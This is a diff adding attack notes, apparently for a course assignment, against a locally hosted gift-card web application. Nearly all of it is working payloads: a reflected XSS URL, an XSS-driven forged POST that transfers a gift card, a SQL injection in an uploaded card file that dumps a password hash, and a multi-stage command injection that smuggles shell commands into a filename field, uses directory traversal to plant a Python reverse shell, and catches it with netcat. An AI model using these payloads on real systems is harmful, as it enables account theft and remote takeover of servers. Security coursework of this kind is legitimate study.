@@ -1,0 +1,151 @@
+##############################################################
+Xss Attack
+
+http://127.0.0.1:8000/gift/0?director=%3Cscript%3Ealert(1)%3C/script%3E
+
+
+END XSS Attack
+##############################################################
+
+
+##############################################################
+CSRF Attack
+
+- Force User to Gift Card
+
+http://127.0.0.1:8000/gift/1?director=%3Cscript%3E%0Avar%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0Axhttp.open%28%22POST%22%2C%20%22%2Fgift%2F3%22%2C%20true%29%3B%0Axhttp.setRequestHeader%28%22Content-type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Axhttp.send%28%22amount%3D2000%26username%3Dtest2%22%29%3B%20%0A%3C%2Fscript%3E
+
+
+End CSRF Attack
+##############################################################
+
+##############################################################
+SQL Injection
+
+By creating a file with the following content and then uploading as part of "provide your own giftcard" functionality on the use page, we can dump salt and password hash for user test1
+{
+  "merchant_id": "GiftCardz.com                   ",
+  "customer_id": "DuaneGreenes Store 1451         ",
+  "total_value": 2000,
+  "records": [
+    {
+      "record_type": "amount_change",
+      "amount_added": 2000,
+      "signature": "1' UNION SELECT password from LegacySite_user WHERE username= 'test1"
+    }
+  ]
+}
+
+***********************************
+Full POST request from Burp
+***********************************
+POST /use.html HTTP/1.1
+Host: 127.0.0.1:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://127.0.0.1:8000/use.html
+Content-Type: multipart/form-data; boundary=---------------------------36848165132693867485575213236
+Content-Length: 811
+Origin: http://127.0.0.1:8000
+DNT: 1
+Connection: close
+Cookie: sessionid=9i4yetk0vuonksb44n6mxeu3076kcnba
+Upgrade-Insecure-Requests: 1
+
+-----------------------------36848165132693867485575213236
+Content-Disposition: form-data; name="card_data"; filename="giftcard_example.gft"
+Content-Type: application/octet-stream
+
+{
+  "merchant_id": "GiftCardz.com                   ",
+  "customer_id": "DuaneGreenes Store 1451         ",
+  "total_value": 2000,
+  "records": [
+    {
+      "record_type": "amount_change",
+      "amount_added": 2000,
+      "signature": "1' UNION SELECT password from LegacySite_user WHERE username= 'test1"
+    }
+  ]
+}
+
+
+-----------------------------36848165132693867485575213236
+Content-Disposition: form-data; name="card_supplied"
+
+True
+-----------------------------36848165132693867485575213236
+Content-Disposition: form-data; name="card_fname"
+
+test2
+-----------------------------36848165132693867485575213236--
+
+END SQL Injection
+##############################################################
+
+##############################################################
+Command Injection
+
+Put together a multiple stage exploit to get reverse shell from this bug. Steps which require command injection must upload file which does not
+contain json data. For those, I just set card_data = "no json" in BURP Repeater. These steps use the same POST request to use.html as the SQL Injection attack just with different values for card_data, card_fname. card_supplied still equals True
+
+1) discover current working directory
+POST /use.html HTTP/1.1
+
+card_data: no json
+card_fname: test3;pwd|tee tmp_file#
+
+Outputs pwd to tmp_file and then when the 500 error is returned can see full path to current directory; output found in <td>s</td>
+
+2) Upload reverse_shell.py
+
+Not using the command injection vulnerability here but there is a directory traversal issue used to move out side of /tmp/ directory.
+Here we use the path that was discovered in step 1 to write our reverse_shell to the current working directory. 
+
+POST /use.html HTTP/1.1
+
+-----------------------------243619571321209919733622682574
+Content-Disposition: form-data; name="card_data"; filename="giftcard_example.json"
+Content-Type: application/json
+
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+
+-----------------------------243619571321209919733622682574
+Content-Disposition: form-data; name="card_supplied"
+
+True
+-----------------------------243619571321209919733622682574
+Content-Disposition: form-data; name="card_fname"
+
+../home/donald/nyu/appsec/nyuappsec/assignment2/reverse
+-----------------------------243619571321209919733622682574--
+
+
+3)Check for name of file
+
+Since the application prepends and appends information to our filename we just want to confirm what it is called and that it is uploaded.
+
+POST /use.html HTTP/1.1
+
+card_data: no json
+card_fname: test3;ls -la |tee tmp_file# 
+
+Output of ls can be found in <td>s</td> of 500 error.
+
+4) Execute Reverse Shell
+
+Now we just execute the reverse shell. This requires having a listener ready to accept the incoming connection. Use netcat.
+  nc -lvp 1234
+
+POST /use.html HTTP/1.1
+
+card_data: no json
+card_fname: test3;python3 reverse_8_parser.gftcrd & #
+
+##############################################################
+
+
+
